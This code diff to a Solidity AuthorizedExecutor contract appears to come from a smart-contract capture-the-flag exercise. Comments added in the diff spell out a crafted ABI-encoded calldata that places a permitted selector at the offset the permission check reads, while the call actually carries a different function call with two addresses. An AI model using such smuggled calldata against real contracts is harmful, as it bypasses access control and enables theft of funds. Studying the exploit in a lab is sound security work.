@@ -3,6 +3,7 @@ pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
+import "hardhat/console.sol";
 
 /**
  * @title AuthorizedExecutor
@@ -50,14 +51,27 @@ abstract contract AuthorizedExecutor is ReentrancyGuard {
         // Read the 4-bytes selector at the beginning of `actionData`
         bytes4 selector;
         uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
+    
+        //        selector               target 32-padded                                            offset of actionData (2 * 32 bytes)                                     length of actionData (1 byte)                                     actionData
+// original: 0x | 1cff79cd | 0000000000000000000000001000000000000000000000000000000000000002 | 0000000000000000000000000000000000000000000000000000000000000040 | 0000000000000000000000000000000000000000000000000000000000000001 | ff00000000000000000000000000000000000000000000000000000000000000
+
+
+        //        selector               target 32-padded                                            offset of actionData (4 * 32 bytes)                                     padding                                                                 fake actionData                                            length of actiondata (68 bytes)                                 actionData
+// crafted:  0x | 1cff79cd | 000000000000000000000000e7f1725E7734CE288F8367e1Bb143E90bb3F0512 | 0000000000000000000000000000000000000000000000000000000000000080 | 0000000000000000000000000000000000000000000000000000000000000000 | d9caed1200000000000000000000000000000000000000000000000000000000 | 0000000000000000000000000000000000000000000000000000000000000044 | 85fb709d00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
+
+
+// 0x           85fb709d00000000000000000000000070997970c51812dc3a010c7d01b50e0d17dc79c80000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
+
+
+
         assembly {
             selector := calldataload(calldataOffset)
         }
-
         if (!permissions[getActionId(selector, msg.sender, target)]) {
             revert NotAllowed();
         }
 
+        
         _beforeFunctionCall(target, actionData);
 
         return target.functionCall(actionData);
